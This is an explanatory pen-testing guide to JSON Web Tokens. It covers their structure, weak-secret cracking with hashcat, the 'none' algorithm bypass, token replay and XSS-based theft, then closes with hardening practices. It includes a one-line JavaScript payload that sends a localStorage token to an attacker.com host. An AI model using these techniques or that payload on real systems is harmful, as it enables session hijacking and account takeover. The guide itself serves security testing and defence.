# JWT Overview

## JSON Web Tokens (JWTs) – Explained for Web Application Pen Testing

### High-Level Summary

**JSON Web Tokens (JWTs)** are a widely used **stateless** authentication mechanism for securely transmitting information between parties. JWTs are **digitally signed**, typically using **HMAC SHA256** or **RSA** to ensure integrity and authenticity.

**Primary Use Case:** JWTs are commonly used for **authentication** in web applications, allowing users to maintain session states without server-side session storage.

***

### Definition Bank

| **Term**                 | **Definition**                                                                             |
| ------------------------ | ------------------------------------------------------------------------------------------ |
| **JWT (JSON Web Token)** | A compact, self-contained token format for securely transmitting user authentication data. |
| **Header**               | Contains metadata, including the token type and signing algorithm.                         |
| **Payload (Claims)**     | Contains user-related data, such as identity, expiration, and custom attributes.           |
| **Signature**            | A cryptographic hash ensuring token integrity and authenticity.                            |
| **Base64 Encoding**      | JWT components are Base64-encoded for readability but are **not encrypted**.               |

***

### JWT Structure

A **JWT** consists of three parts, separated by dots (`.`):

```
HEADER.PAYLOAD.SIGNATURE
```

**Example JWT (Shortened for Clarity):**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvZSIsImlhdCI6MTUxNjIzOTAyMn0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

***

### JWT Components

#### 1. Header

The **header** defines metadata about the JWT, including the **algorithm** used to sign the token.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Security Considerations:**

* **HS256 (HMAC)** uses a shared secret and is vulnerable if the secret key is weak.
* **RS256 (RSA)** is asymmetric and provides better security but requires a **public/private key pair**.

***

#### 2. Payload (Claims)

The **payload** contains user-related claims.

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "exp": 1714044800
}
```

**Common JWT Claims:**

* **`sub` (Subject):** Identifies the user.
* **`exp` (Expiration):** Defines token expiry (UNIX timestamp).
* **`iat` (Issued At):** Indicates when the token was generated.
* **`admin` (Custom Claim):** Custom attributes for user roles.

**Penetration Testing Insight:**

* Modifying `"admin": false` to `"admin": true` may grant privilege escalation.
* Missing **`exp`** (expiration) allows tokens to be reused indefinitely.

***

#### 3. Signature

JWTs include a **signature** to ensure data integrity.

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

**Penetration Testing Insight:**

* A **weak secret key** can be brute-forced.
* JWTs signed with **"none"** algorithm allow signature bypass attacks.

***

### How JWTs Are Used in Web Applications

* **Authentication:** Users receive a JWT upon login and send it as a `Bearer` token in the `Authorization` header.
* **Session Management:** JWTs eliminate server-side sessions by embedding user data within the token.
* **Data Exchange:** Enables stateless transmission of claims between different parts of an application.

***

### JWT Security Vulnerabilities

| **Vulnerability**               | **Impact**                                                                                 | **Testing Method**                                                       |
| ------------------------------- | ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------ |
| **Weak Secret Keys (HS256)**    | Allows an attacker to forge tokens by brute-forcing the signing key.                       | Use **John the Ripper** or **Hashcat** to crack the key.                 |
| **No Expiration (`exp`) Claim** | Allows session tokens to be used indefinitely.                                             | Remove the `exp` claim and check if the token is still valid.            |
| **Algorithm Confusion (None)**  | If the server accepts `"none"` as an algorithm, signatures can be bypassed.                | Modify the token header to `"alg": "none"` and remove the signature.     |
| **Insecure Token Storage**      | Tokens stored in `localStorage` can be stolen via **XSS attacks**.                         | Inject a **XSS payload** to extract JWTs from `localStorage`.            |
| **Token Replay Attacks**        | If the token does not contain a **unique identifier**, it can be reused even after logout. | Reuse the JWT token after logging out to see if access is still granted. |

***

### JWT Attacks & Bypasses

#### 1. Brute-Forcing Weak Secrets

If an application uses **HS256** with a weak secret, it can be cracked using **John the Ripper** or **Hashcat**.

```bash
hashcat -m 16500 jwt.txt rockyou.txt
```

***

#### 2. Algorithm Confusion (None)

Some applications **fail to enforce signed algorithms**, allowing an attacker to **change the algorithm** to `"none"` and remove the signature.

**Exploit**

Modify the JWT header to:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Then remove the signature and resend the token. If accepted, the application does not validate JWT signatures correctly.

***

#### 3. Token Replay Attacks

If the **expiration (`exp`) claim is missing**, JWTs can be reused indefinitely.

**Testing Steps:**

1. Capture a JWT from an authenticated request.
2. Logout from the application.
3. Replay the JWT request. If access is granted, the token is **not being invalidated** on logout.

***

#### 4. XSS-Based Token Theft

If JWTs are stored in `localStorage`, they can be stolen via **Cross-Site Scripting (XSS)**.

```javascript
fetch("https://attacker.com/steal?token=" + localStorage.getItem("jwt"));
```

***

### Best Practices for Securing JWTs

✅ **Use Strong Secrets:** Use a **random, high-entropy key** for HMAC algorithms.\
✅ **Enforce Expiration (`exp`) Claims:** Tokens should expire within a short timeframe.\
✅ **Use Asymmetric Encryption (RS256):** Prefer **RS256** over **HS256**.\
✅ **Disable `none` Algorithm:** Ensure `"none"` is not a valid signing algorithm.\
✅ **Store Tokens Securely:** Use **HTTP-only cookies** instead of `localStorage`.\
✅ **Implement Token Rotation:** Issue **short-lived access tokens** and **refresh tokens**.

***

### Secure JWT Example

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
.
{
  "sub": "1234567890",
  "name": "John Doe",
  "exp": 1714044800
}
.
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

**Why Secure?**

* **Strong HMAC key** used.
* **Expiration claim (`exp`)** present.
* **Minimal sensitive data stored in payload.**

***

### Penetration Testing Checklist for JWTs

* [ ] **Check for Weak Secrets:** Test with `John the Ripper`.
* [ ] **Test Algorithm Switching:** Modify `"alg": "none"`.
* [ ] **Replay the Token:** Attempt using the token after logout.
* [ ] **Look for Missing Claims:** Ensure `exp` and `iat` are present.
* [ ] **Inspect Storage Location:** Avoid tokens in `localStorage`.

***

### Final Takeaways

* JWTs **enable stateless authentication** but require **strong security controls**.
* Web application testers should focus on **weak keys, missing claims, and algorithm abuse**.
* Tools like **jwt.io** simplify **token analysis** and **modification**.

By implementing **strong cryptographic standards** and **secure storage practices**, JWT-based authentication can be **reliable and secure** against common attacks.
